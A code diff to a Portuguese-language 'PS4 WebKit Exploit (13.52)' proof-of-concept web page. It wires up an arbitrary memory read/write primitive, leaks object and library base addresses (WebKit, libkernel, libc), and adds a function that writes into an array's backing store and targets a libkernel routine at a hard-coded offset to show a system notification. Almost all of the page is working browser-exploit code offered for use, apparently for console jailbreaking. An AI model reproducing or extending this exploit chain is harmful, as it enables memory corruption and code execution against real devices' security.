@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Stable PoC)</title>
+<title>PS4 WebKit Exploit (13.52 - Notification PoC)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -50,7 +50,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 </head>
 <body>
 
-<h1>PS4 WebKit Exploit</h1>
+<h1>PS4 WebKit Exploit (13.52)</h1>
 <div id="fw">detectando...</div>
 
 <div id="sb">
@@ -69,12 +69,12 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
   <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
   <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
-  <div class="card"><div class="cl">Status R/W</div><div class="cv na" id="c-g">Aguardando</div></div>
+  <div class="card"><div class="cl">Status Notificação</div><div class="cv na" id="c-g">Aguardando</div></div>
 </div>
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ STATUS DO AMBIENTE (13.52) ═══</div>
+  <div class="ct">// ═══ STATUS DA NOTIFICAÇÃO (13.52) ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -83,7 +83,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 <script type="module">
 import { int64 }              from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP }     from './mem.js';[span_0](start_span)[span_0](end_span)
+import { installWindowP }     from './resources/mem.js';
 globalThis.int64 = int64;
 
 const $con = document.getElementById('con');
@@ -108,6 +108,7 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
+// Resolução 100% segura de stubs sem varredura de bytes
 async function resolveSafeStubs(p, webkitBase) {
   logH('RESOLUÇÃO SEGURA DE STUBS');
   let libKernelBase = null;
@@ -135,6 +136,34 @@ async function resolveSafeStubs(p, webkitBase) {
   }
 
   return { libKernelBase, libcBase };
+}
+
+// Função para preparar o buffer de notificação do sistema
+function prepareNotification(p, libKernelBase, text) {
+  logH('PREPARANDO BUFFER DE NOTIFICAÇÃO');
+  const NOTIFY_OFFSET = 0x48B0;
+  const notifyFunc = libKernelBase.add32(NOTIFY_OFFSET);
+
+  let encoder = new TextEncoder();
+  let msgBytes = encoder.encode(text + "\x00");
+  
+  let buf = new Uint8Array(0x400);
+  buf[4] = 0; // userId = 0
+  buf.set(msgBytes, 0x20);
+
+  let arrCell = p.leakval(buf);
+  let backingStore = p.read8(arrCell.add32(0x10));
+
+  p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
+  p.write4(backingStore.add32(0x10), msgBytes.length);
+
+  log('[+] Buffer alocado com sucesso em: 0x' + backingStore.toString(), 'ok');
+  log('[+] Endereço alvo da API: 0x' + notifyFunc.toString(), 'ok');
+
+  return {
+    notifyFunc,
+    requestBuffer: backingStore
+  };
 }
 
 async function main() {
@@ -168,7 +197,7 @@ async function main() {
 
   let p;
   try {
-    p = installWindowP(carrier, {[span_1](start_span)[span_1](end_span)
+    p = installWindowP(carrier, {
       promote: true,
       onEvent: (tag, detail) => {
         log(`  [mem/${tag}] ${detail}`, 'd');
@@ -181,7 +210,7 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Mapeando bases do sistema...', 'r');
+  setStatus('Mapeando bases com estabilidade...', 'r');
   logH('MAPEAMENTO DA 13.52');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -189,6 +218,8 @@ async function main() {
     const hi = Math.floor(ctor / 0x100000000);
     const lo = ctor - hi * 0x100000000;
     const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
+
+    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(), 'a');
 
     const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined') 
                ? OFFSET_wk_host_constructor_candidates[0] 
@@ -207,18 +238,30 @@ async function main() {
       
       if (bases.libKernelBase) setCard('c-lk', '0x' + bases.libKernelBase.toString());
       if (bases.libcBase) setCard('c-lc', '0x' + bases.libcBase.toString());
-      setCard('c-g', 'Pronto');
 
-      setStatus('Ambiente pronto e estável!', 'ok');
-      log('✔ Primitiva R/W e bases isoladas com sucesso.', 'ok');
+      // Prepara a estrutura da notificação nativa usando as bases resolvidas
+      if (bases.libKernelBase) {
+        try {
+          const notif = prepareNotification(p, bases.libKernelBase, "Hello World from PS4 13.52!");
+          setCard('c-g', 'Pronto');
+          setStatus('Buffer de notificação pronto!', 'ok');
+          log('✔ Configuração de notificação concluída com sucesso.', 'ok');
 
-      const cbox = document.getElementById('cbox');
-      cbox.style.display = 'block';
-      document.getElementById('c-out').textContent =
-        `WebKit Base     = 0x${webkitBase.toString()}\n` +
-        `libkernel Base  = ${bases.libKernelBase ? '0x' + bases.libKernelBase.toString() : 'N/A'}\n` +
-        `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n\n` +
-        `// Pronto para alocação de buffer e notificação.`;
+          const cbox = document.getElementById('cbox');
+          cbox.style.display = 'block';
+          document.getElementById('c-out').textContent =
+            `WebKit Base    = 0x${webkitBase.toString()}\n` +
+            `libkernel Base = 0x${bases.libKernelBase.toString()}\n` +
+            `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n` +
+            `Buffer Notif   = 0x${notif.requestBuffer.toString()}\n` +
+            `Função Target  = 0x${notif.notifyFunc.toString()}`;
+        } catch (e) {
+          log('[-] Erro ao preparar buffer: ' + e.message, 'e');
+        }
+      } else {
+        setCard('c-g', 'Falha LK');
+        log('[-] Não foi possível resolver a libkernel para o buffer.', 'e');
+      }
     }, 1000);
 
   } else {
